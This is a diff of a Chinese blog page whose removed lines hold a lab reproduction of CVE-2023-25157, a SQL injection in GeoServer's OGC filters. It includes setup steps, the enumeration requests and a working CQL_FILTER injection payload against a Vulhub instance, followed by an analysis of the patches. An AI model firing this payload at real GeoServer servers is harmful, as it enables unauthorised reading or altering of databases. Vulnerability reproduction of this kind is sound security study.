-<p><strong>此时复现的系统版本为2.22.1</strong></p>
-<p>以下是采用官方给的文档搭建的环境</p>
-<p>在这里使用&nbsp;<a target="_blank" rel="noopener" href="https://geoserver.org/release/2.21.3">GeoServer 2.21.3</a>，下载完成后解压：</p>
-<figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">unzip</span> geoserver-<span class="hljs-number">2</span>.<span class="hljs-number">21</span>.<span class="hljs-number">3</span>-bin.zip<br></code></pre></td></tr></tbody></table></figure>
-
-<p>进入到&nbsp;<code>geoserver-2.21.3-bin/bin</code>&nbsp;目录下，执行启动程序</p>
-<figure class="highlight stata"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">sh</span> startup.<span class="hljs-keyword">sh</span><br></code></pre></td></tr></tbody></table></figure>
-
-<p class='item-img' data-src='https://s2.loli.net/2023/12/10/UhPelsNOky8SYCV.png'><img src="https://s2.loli.net/2023/12/10/UhPelsNOky8SYCV.png" alt="Untitled 4.png"></p>
-<p class='item-img' data-src='https://s2.loli.net/2023/12/10/WhGxXifve4mMd3A.png'><img src="https://s2.loli.net/2023/12/10/WhGxXifve4mMd3A.png" alt="Untitled 5.png"></p>
-<p>使用 Docker 搭建 PostgreSQL</p>
-<figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">docker <span class="hljs-built_in">run</span> -e <span class="hljs-attribute">POSTGRES_PASSWORD</span>=password -d -p 5433:5432  postgres:latest<br></code></pre></td></tr></tbody></table></figure>
-
-<p>进入容器</p>
-<p class='item-img' data-src='https://s2.loli.net/2023/12/10/NtEOiIB4RCq2sy9.png'><img src="https://s2.loli.net/2023/12/10/NtEOiIB4RCq2sy9.png" alt="Untitled 6.png"></p>
-<p>安装&nbsp;<code>postgis</code>&nbsp;拓展</p>
-<figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">apt</span> search postgis<br><br><span class="hljs-attribute">apt</span> install postgis postgresql-<span class="hljs-number">14</span>-postgis-<span class="hljs-number">3</span>-scripts<br></code></pre></td></tr></tbody></table></figure>
-
-<p class='item-img' data-src='https://s2.loli.net/2023/12/10/vdNI398ySfxXQru.png'><img src="https://s2.loli.net/2023/12/10/vdNI398ySfxXQru.png" alt="Untitled 7.png"></p>
-<p class='item-img' data-src='https://s2.loli.net/2023/12/10/Ta9V4tP8uzc5nXp.png'><img src="https://s2.loli.net/2023/12/10/Ta9V4tP8uzc5nXp.png" alt="Untitled 8.png"></p>
-<p><code>postgresql-14-postgis-3-scripts</code>&nbsp;要根据你 PostgreSQL 来安装，本次使用到的 PostgreSQL 为&nbsp;<code>PostgreSQL 14.1</code></p>
-<p>此时数据可参考官方文档：<a target="_blank" rel="noopener" href="https://docs.geoserver.org/latest/en/user/gettingstarted/postgis-quickstart/index.html">https://docs.geoserver.org/latest/en/user/gettingstarted/postgis-quickstart/index.html</a></p>
-<p>编辑&nbsp;<code>startup.sh</code>&nbsp;启动脚本添加远程调试参数：</p>
-<figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">exec <span class="hljs-string">"<span class="hljs-variable">$&#123;_RUNJAVA&#125;</span>"</span> <span class="hljs-variable">$&#123;JAVA_OPTS:--DNoJavaOpts -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005&#125;</span> <span class="hljs-string">"<span class="hljs-variable">$&#123;MARLIN_ENABLER:--DMarlinDisabled&#125;</span>"</span> <span class="hljs-string">"<span class="hljs-variable">$&#123;RENDERER:--DDefaultrenderer&#125;</span>"</span> <span class="hljs-string">"-Djetty.base=<span class="hljs-variable">$&#123;GEOSERVER_HOME&#125;</span>"</span> <span class="hljs-string">"-DGEOSERVER_DATA_DIR=<span class="hljs-variable">$&#123;GEOSERVER_DATA_DIR&#125;</span>"</span> -Djava.awt.<span class="hljs-attribute">headless</span>=<span class="hljs-literal">true</span> -DSTOP.<span class="hljs-attribute">PORT</span>=8079 -DSTOP.<span class="hljs-attribute">KEY</span>=geoserver -jar <span class="hljs-string">"<span class="hljs-variable">$&#123;GEOSERVER_HOME&#125;</span>/start.jar"</span><br></code></pre></td></tr></tbody></table></figure>
-
-<p>至此环境搭建结束。</p>
-<h1 id="六-漏洞分析"><a href="#六-漏洞分析" class="headerlink" title="六.漏洞分析"></a>六.漏洞分析</h1><p>这里采用vulnhub环境进行复现</p>
-<p>为了正确利用这些漏洞，首先需要获得：</p>
-<ol>
-<li>可用的功能名称</li>
-<li>每个可用功能的可用属性</li>
-</ol>
-<p>分别。因此，以下请求发送到目标服务器以获取可用的功能名称。</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET /geoserver/ows?service=WFS&amp;version=1.0.0&amp;request=GetCapabilities HTTP/1.1<br>Host: vulnerablehost<br>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0<br>Accept-Encoding: gzip, deflate<br>Accept: */*<br>Connection: close<br></code></pre></td></tr></tbody></table></figure>
-
-<p>获取可用功能名称后，我们需要发送以下 HTTP 请求来获取相关可用功能的可用属性。</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET /geoserver/ows?service=wfs&amp;version=1.0.0&amp;request=GetFeature&amp;typeName=&lt;nameOftheAvailabeFeatureHere&gt;=strStartsWith%28&lt;nameOftheAvailabePropertyHere&gt;%2C%27x%27%27%29+%3D+<span class="hljs-literal">true</span>+and+1%3D%28SELECT+CAST+%28%28SELECT+version()%29+AS+INTEGER%29%29+--+%27%29+%3D+<span class="hljs-literal">true</span> HTTP/1.1<br>Host: vulnerablehost<br>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0<br>Accept-Encoding: gzip, deflate<br>Accept: */*<br>Connection: close<br></code></pre></td></tr></tbody></table></figure>
-
-<p>枚举所有可用的功能名称以及与这些功能名称关联的属性名称。在此阶段之后，可以通过将 SQL 有效负载注入的恶意 HTTP 请求发送到服务器以获取任何获取的属性来执行利用过程。</p>
-<figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /geoserver/ows?service=wfs&amp;version=<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>&amp;request=GetFeature&amp;typeName=&lt;nameOftheAvailabeFeatureHere&gt;=strStartsWith%<span class="hljs-number">28</span>&lt;nameOftheAvailabePropertyHere&gt;%<span class="hljs-number">2</span>C%<span class="hljs-number">27</span>x%<span class="hljs-number">27</span>%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>+%<span class="hljs-number">3</span>D+true+and+<span class="hljs-number">1</span>%<span class="hljs-number">3</span>D%<span class="hljs-number">28</span>SELECT+CAST+%<span class="hljs-number">28</span>%<span class="hljs-number">28</span>SELECT+version()%<span class="hljs-number">29</span>+AS+INTEGER%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>+--+%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>+%<span class="hljs-number">3</span>D+true HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: vulnerablehost<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (X11; Linux x86_64; rv:<span class="hljs-number">102</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">102</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>: */*<br><span class="hljs-attribute">Connection</span>: close<br></code></pre></td></tr></tbody></table></figure>
-
-<p>1利用前提<br>首先，在利用此漏洞之前，必须找到包含 PostGIS 数据存储的现有工作空间。Vulhub的GeoServer实例已经有一个PostGIS数据存储：</p>
-<table>
-<thead>
-<tr>
-<th>工作区名称</th>
-<th>vulhub</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>数据存储名称</td>
-<td>pg</td>
-</tr>
-<tr>
-<td>要素类型（表）名称</td>
-<td>example</td>
-</tr>
-<tr>
-<td>要素类型的属性之一</td>
-<td>name</td>
-</tr>
-</tbody></table>
-<figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /geoserver/ows?service=wfs&amp;version=<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>&amp;request=GetFeature&amp;typeName=&lt;nameOftheAvailabeFeatureHere&gt;&amp;maxFeatures=<span class="hljs-number">1</span>&amp;outputFormat=json HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: vulnerablehost<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (X11; Linux x86_64; rv:<span class="hljs-number">102</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">102</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br></code></pre></td></tr></tbody></table></figure>
-
-<p>构造payload/poc</p>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="http://192.168.126.128:8080/geoserver/ows?service=WFS&amp;version=1.0.0&amp;request=GetFeature&amp;typeName=vulhub:example&amp;CQL_FILTER=strStartsWith(name,%27x%27%27)">http://192.168.126.128:8080/geoserver/ows?service=WFS&amp;version=1.0.0&amp;request=GetFeature&amp;typeName=vulhub:example&amp;CQL_FILTER=strStartsWith(name,’x’’)</a> = true and 1=(SELECT CAST ((SELECT version()) AS integer)) – ‘) = true</p>
-</blockquote>
-<p class='item-img' data-src='https://s2.loli.net/2023/12/10/UXz5VgIe4Tat3cr.png'><img src="https://s2.loli.net/2023/12/10/UXz5VgIe4Tat3cr.png" alt="Untitled 9.png"></p>
-<p>成功注入获取版本信息。</p>
-<p class='item-img' data-src='https://s2.loli.net/2023/12/10/6dhUgZxfOl2DN85.png'><img src="https://s2.loli.net/2023/12/10/6dhUgZxfOl2DN85.png" alt="Untitled 10.png"></p>
-<p>使用wireshark抓包结果如下</p>
-<p class='item-img' data-src='https://s2.loli.net/2023/12/10/JDyYoGlnsM9ZwbP.png'><img src="https://s2.loli.net/2023/12/10/JDyYoGlnsM9ZwbP.png" alt="Untitled 11.png"></p>
-<p>脚本演示</p>
-<p class='item-img' data-src='https://s2.loli.net/2023/12/10/xl8QWZKXsjNtLov.png'><img src="https://s2.loli.net/2023/12/10/xl8QWZKXsjNtLov.png" alt="Untitled 12.png"></p>
-<p class='item-img' data-src='https://s2.loli.net/2023/12/10/qHfaDd7XRGey2cp.png'><img src="https://s2.loli.net/2023/12/10/qHfaDd7XRGey2cp.png" alt="Untitled 13.png"></p>
-<h1 id="七-漏洞修复"><a href="#七-漏洞修复" class="headerlink" title="七.漏洞修复"></a>七.漏洞修复</h1><p>目前 GeoServer 和 Geotools 官方均已发布修复版本，查看 GeoServer 官方提交的<a target="_blank" rel="noopener" href="https://github.com/geoserver/geoserver/commit/145a8af798590288d270b240235e89c8f0b62e1d">补丁</a>，在&nbsp;<code>src/community/jdbcconfig/src/main/java/org/geoserver/jdbcconfig/internal/ConfigDatabase.java</code>&nbsp;中添加了模块<code>org.geoserver.jdbcloader.JDBCLoaderProperties</code>&nbsp;模块用于配置文件&nbsp;<code>jdbcconfig/jdbcconfig.properties</code>中的 JDBCConfig 模块属性字段并更改了构造函数以包含此属性字段。</p>
-<p class='item-img' data-src='https://s2.loli.net/2023/12/10/yPOISvdBGgEi8Wr.png'><img src="https://s2.loli.net/2023/12/10/yPOISvdBGgEi8Wr.png" alt="Untitled 14.png"></p>
-<p class='item-img' data-src='https://s2.loli.net/2023/12/10/aYbThdwyjOlEQpe.png'><img src="https://s2.loli.net/2023/12/10/aYbThdwyjOlEQpe.png" alt="Untitled 15.png"></p>
-<p>还修改了</p>
-<p>&nbsp;<code>src/community/jdbcconfig/src/main/java/org/geoserver/jdbcconfig/internal/OracleDialect.java</code>&nbsp;中的插入语法</p>
-<p class='item-img' data-src='https://s2.loli.net/2023/12/10/KESfHD59icqo6Td.png'><img src="https://s2.loli.net/2023/12/10/KESfHD59icqo6Td.png" alt="Untitled 16.png"></p>
-<p>而在 GeoTools 提交的补丁，修改&nbsp;</p>
-<p><code>modules/library/jdbc/src/main/java/org/geotools/data/jdbc/FilterToSQL.java</code>&nbsp;添加了<code>EscapeSql</code>&nbsp;模块和&nbsp;<code>escapeBackslash</code>&nbsp;字段对 SQL 注入进行防御</p>
-<p class='item-img' data-src='https://s2.loli.net/2023/12/10/edQg7UcvsMr154C.png'><img src="https://s2.loli.net/2023/12/10/edQg7UcvsMr154C.png" alt="Untitled 17.png"></p>
-<p class='item-img' data-src='https://s2.loli.net/2023/12/10/cKOkgQrA2NjlFPv.png'><img src="https://s2.loli.net/2023/12/10/cKOkgQrA2NjlFPv.png" alt="Untitled 18.png"></p>
-<p class='item-img' data-src='https://s2.loli.net/2023/12/10/eM2S3uRLpyxdDfo.png'><img src="https://s2.loli.net/2023/12/10/eM2S3uRLpyxdDfo.png" alt="Untitled 19.png"></p>
-<h1 id="八-漏洞总结"><a href="#八-漏洞总结" class="headerlink" title="八.漏洞总结"></a>八.漏洞总结</h1><p>总之，正如 CVE-2023-25157 所概述的那样，在 GeoServer 和 GeoTools 中发现这些 SQL 注入漏洞，清楚地提醒人们数字环境中始终存在的威胁。这些漏洞位于核心 OGC 筛选器和函数表达式中，可能导致重大中断和未经授权的数据访问或修改。</p>
-<h1 id="九-参考资料"><a href="#九-参考资料" class="headerlink" title="九.参考资料"></a>九.参考资料</h1><p><a target="_blank" rel="noopener" href="https://github.com/murataydemir/CVE-2023-25157-and-CVE-2023-25158">https://github.com/murataydemir/CVE-2023-25157-and-CVE-2023-25158</a></p>
-<p><a target="_blank" rel="noopener" href="https://docs.geoserver.org/latest/en/user/introduction/overview.html">https://docs.geoserver.org/latest/en/user/introduction/overview.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_48539059/article/details/132622485">CVE-2023-25157：GeoServer OGC Filter SQL注入漏洞复现_geoserver最新版本_gaynell的博客-CSDN博客</a></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
   <nav class="pagination">
     <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/3/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/5/"><i class="fa fa-angle-right"></i></a>
   </nav>
@@ -1773,14 +1817,14 @@
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">340k</span>
+    <span title="站点总字数">349k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">20:37</span>
+    <span title="站点阅读时长">21:11</span>
   </span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
